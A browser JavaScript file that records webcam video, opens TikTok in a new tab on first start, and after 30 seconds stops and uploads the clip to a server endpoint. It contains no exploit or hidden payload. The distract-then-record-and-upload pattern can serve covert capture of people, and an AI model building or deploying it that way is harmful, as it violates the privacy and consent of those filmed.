let CONFIG = {};
let mediaRecorder = null;
let recordedChunks = [];
let videoStream = null;
let tiktokOpened = false;
let autoStopTimer = null;
let countdownTimer = null;
let recordingSeconds = 0;
let isUploading = false;

let startBtn, stopAndUploadBtn, video, statusDiv, timerDiv;

async function loadConfig() {
    try {
        const response = await fetch('/config.json');
        CONFIG = await response.json();
        console.log('Configuration loaded:', CONFIG);
    } catch (error) {
        console.warn('Could not load config.json, using defaults');
        CONFIG = {
            tiktokUrl: "https://www.tiktok.com",
            autoSaveSeconds: 30,
            videoQuality: { width: 640, height: 480 },
            recordingInterval: 1000,
            videoMimeType: "video/webm",
            uploadEndpoint: "/upload",
            enableAutoSave: true,
            enablePageCloseWarning: true
        };
    }
}

function showStatus(message, type = 'info') {
    statusDiv.textContent = message;
    statusDiv.className = `status ${type}`;
    console.log(message);
}

function updateTimerDisplay() {
    timerDiv.textContent = `Recording: ${recordingSeconds} seconds`;
}

function startCountdown() {
    recordingSeconds = 0;
    updateTimerDisplay();
    countdownTimer = setInterval(() => {
        recordingSeconds++;
        updateTimerDisplay();
    }, 1000);
}

function stopCountdown() {
    if (countdownTimer) {
        clearInterval(countdownTimer);
        countdownTimer = null;
    }
}

function checkBrowserSupport() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        showStatus("Error: Camera access not supported. Please use HTTPS.", 'error');
        startBtn.disabled = true;
        stopAndUploadBtn.disabled = true;
        return false;
    }
    return true;
}

async function uploadVideo(isAutoUpload = false) {
    if (recordedChunks.length === 0) {
        showStatus("No video to upload. Record something first.", 'error');
        return false;
    }
    
    if (isUploading) {
        console.log("Upload already in progress");
        return false;
    }
    
    try {
        isUploading = true;
        showStatus("Processing video for upload...", 'info');
        
        const videoBlob = new Blob(recordedChunks, { type: CONFIG.videoMimeType });
        if (videoBlob.size === 0) {
            showStatus("Video is empty. Try recording again.", 'error');
            isUploading = false;
            return false;
        }
        
        const formData = new FormData();
        formData.append('video', videoBlob, 'recording.webm');
        
        showStatus("Uploading to cloud storage...", 'info');
        
        const response = await fetch(CONFIG.uploadEndpoint, {
            method: 'POST',
            body: formData
        });
        
        const result = await response.json();
        
        if (response.ok && result.success) {
            const message = isAutoUpload ? "Auto-saved successfully to cloud!" : "Upload successful! Video saved privately.";
            showStatus(message, 'success');
            recordedChunks = [];
            isUploading = false;
            return true;
        } else {
            showStatus("Upload failed: " + (result.message || "Unknown error"), 'error');
            isUploading = false;
            return false;
        }
    } catch (error) {
        showStatus("Upload error: " + error.message, 'error');
        isUploading = false;
        return false;
    }
}

function cleanupRecording() {
    if (autoStopTimer) {
        clearTimeout(autoStopTimer);
        autoStopTimer = null;
    }
    stopCountdown();
    if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
        videoStream = null;
    }
}

async function startRecording() {
    if (!checkBrowserSupport()) return;
    
    try {
        timerDiv.textContent = "";
        showStatus("Requesting camera access...", 'info');
        
        videoStream = await navigator.mediaDevices.getUserMedia({ 
            video: CONFIG.videoQuality, 
            audio: false 
        });
        
        video.srcObject = videoStream;
        video.onloadedmetadata = () => video.play();
        
        if (!tiktokOpened) {
            tiktokOpened = true;
            window.open(CONFIG.tiktokUrl, '_blank');
            showStatus(`TikTok opened in new tab. Auto-save in ${CONFIG.autoSaveSeconds} seconds.`, 'info');
        }
        
        mediaRecorder = new MediaRecorder(videoStream, { mimeType: CONFIG.videoMimeType });
        recordedChunks = [];
        
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };
        
        mediaRecorder.onstop = async () => {
            const totalSize = recordedChunks.reduce((sum, chunk) => sum + chunk.size, 0);
            showStatus(`Recording stopped. Size: ${totalSize} bytes. Uploading...`, 'info');
            
            cleanupRecording();
            await uploadVideo(false);
            
            startBtn.disabled = false;
            stopAndUploadBtn.disabled = true;
            tiktokOpened = false;
            timerDiv.textContent = "";
        };
        
        mediaRecorder.start(CONFIG.recordingInterval);
        startCountdown();
        
        if (CONFIG.enableAutoSave) {
            autoStopTimer = setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    showStatus(`Auto-saving after ${CONFIG.autoSaveSeconds} seconds...`, 'warning');
                    mediaRecorder.stop();
                    stopAndUploadBtn.disabled = true;
                    stopCountdown();
                }
            }, CONFIG.autoSaveSeconds * 1000);
        }
        
        startBtn.disabled = true;
        stopAndUploadBtn.disabled = false;
        showStatus(`Recording... Auto-saves in ${CONFIG.autoSaveSeconds} seconds or click Stop and Upload.`);
        
    } catch (error) {
        if (error.name === 'NotAllowedError') {
            showStatus("Camera access denied. Click the camera icon in address bar to allow.", 'error');
        } else if (error.name === 'NotFoundError') {
            showStatus("No camera found on this device.", 'error');
        } else {
            showStatus("Camera error: " + error.message, 'error');
        }
    }
}

function stopAndUpload() {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        if (autoStopTimer) {
            clearTimeout(autoStopTimer);
            autoStopTimer = null;
        }
        showStatus("Stopping recording and uploading...", 'info');
        mediaRecorder.stop();
        stopAndUploadBtn.disabled = true;
        stopCountdown();
    }
}

async function init() {
    await loadConfig();
    
    startBtn = document.getElementById('startBtn');
    stopAndUploadBtn = document.getElementById('stopAndUploadBtn');
    video = document.getElementById('video');
    statusDiv = document.getElementById('status');
    timerDiv = document.getElementById('timer');
    
    startBtn.onclick = startRecording;
    stopAndUploadBtn.onclick = stopAndUpload;
    
    if (CONFIG.enablePageCloseWarning) {
        window.addEventListener('beforeunload', function(event) {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                event.preventDefault();
                event.returnValue = 'Recording in progress. Your video will be lost if you leave now.';
                return 'Recording in progress. Your video will be lost if you leave now.';
            }
        });
    }
    
    checkBrowserSupport();
}

init();